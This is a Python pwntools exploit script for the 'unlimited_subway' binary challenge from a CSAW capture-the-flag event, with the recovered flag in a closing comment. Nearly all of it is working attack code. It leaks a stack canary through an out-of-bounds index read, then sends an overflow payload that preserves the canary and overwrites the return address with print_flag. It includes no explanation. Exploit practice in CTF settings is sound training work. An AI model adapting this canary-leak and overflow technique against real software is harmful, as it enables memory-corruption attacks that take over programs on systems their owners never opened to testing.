#!/usr/bin/env python3 

HOST = "pwn.csaw.io"
PORT = 7900

from pwn import *

context.binary = elf = ELF('./unlimited_subway')
# p = process(elf.path)
p = remote(HOST, PORT)

canary_leaked = b''
p.sendlineafter(b'> ', b'V')
p.sendlineafter(b'Index : ', b'131')
p.recvuntil(b': ')
canary_leaked += p.recv(2)
p.sendlineafter(b'> ', b'V')
p.sendlineafter(b'Index : ', b'130')
p.recvuntil(b': ')
canary_leaked += p.recv(2)
p.sendlineafter(b'> ', b'V')
p.sendlineafter(b'Index : ', b'129')
p.recvuntil(b': ')
canary_leaked += p.recv(2)
p.sendlineafter(b'> ', b'V')
p.sendlineafter(b'Index : ', b'128')
p.recvuntil(b': ')
canary_leaked += p.recv(2)

p.sendlineafter(b'> ', b'E')

canary_leaked = int(canary_leaked, 16)
payload = b'x' * 0x40 + p32(canary_leaked) + b'x' * 4 + p32(elf.symbols['print_flag'])

p.sendlineafter(b'Name Size : ', b'200')
p.sendlineafter(b'Name : ', payload)
   
p.interactive()

# csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}